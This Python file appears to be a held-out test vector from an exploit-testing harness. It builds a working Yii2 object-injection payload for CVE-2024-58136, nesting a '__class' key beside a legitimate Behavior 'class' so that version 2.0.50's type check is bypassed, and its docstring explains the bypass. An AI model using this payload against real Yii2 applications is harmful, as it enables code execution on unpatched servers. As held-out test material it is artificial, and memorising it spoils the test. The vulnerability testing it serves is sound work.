#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-58136 residual for deser_yii2_behavior_typecheck.

The nested `__class` object-injection payload. V1's (2.0.50) CVE-2024-4990 type check reads the
`class` key: `isset($value['class']) && is_subclass_of($value['class'], Behavior::class)`. So the
payload sets `class` to a LEGIT Behavior subclass (app\\PcbLegitBehavior) to PASS the check --
while Yii::createObject() resolves the class to instantiate via the `__class` key FIRST
(`if (isset($type['__class'])) { $class = $type['__class']; ... }`), steering instantiation to the
attacker class app\\PcbFlagProbe. => the type check passes but PcbFlagProbe is instantiated on V1
(constructor echoes the canary). V2 (2.0.52) checks `__class` FIRST and refuses it.

"a CVE-2024-4990 regression, as exploited in the wild" (NVD CVE-2024-58136); GHSA-ggwg-cmwp-46r5 /
Rapid7: the 2.0.50 fix "can be bypassed by adding a `class` property which referenced a legitimate
Behavior class."
"""
import json

# The legit Behavior subclass named in `class` to satisfy V1's type check. Any real
# yii\base\Behavior subclass works (e.g. a framework yii\behaviors\* class); the local one keeps
# the app self-contained. It is IGNORED at instantiation because `__class` takes precedence.
LEGIT_BEHAVIOR = "app\\PcbLegitBehavior"

VECTORS = [
    {
        "id": "residual___class_nested",
        "config": json.dumps({
            "as pcb": {"class": LEGIT_BEHAVIOR, "__class": "app\\PcbFlagProbe"}
        }),
    },
]


def candidate(vec=None):
    return vec or VECTORS[0]


if __name__ == "__main__":
    for v in VECTORS:
        print(v["id"], v["config"])
